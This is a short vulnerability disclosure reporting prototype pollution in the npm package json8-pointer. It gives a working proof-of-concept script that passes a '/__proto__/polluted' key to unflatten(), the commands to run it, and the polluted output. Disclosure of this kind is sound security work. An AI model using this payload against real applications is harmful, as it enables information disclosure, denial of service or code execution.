# Description

`json8-pointer` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var json8Pointer = require("json8-pointer")
json8Pointer.unflatten({"": {},"/firstName": "John", "/__proto__/polluted": "Yes! Its Polluted"});
console.log({}.polluted); 
```

2. Execute the following commands in another terminal:

```bash
npm i json8-pointer # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Yes! Its Polluted
```
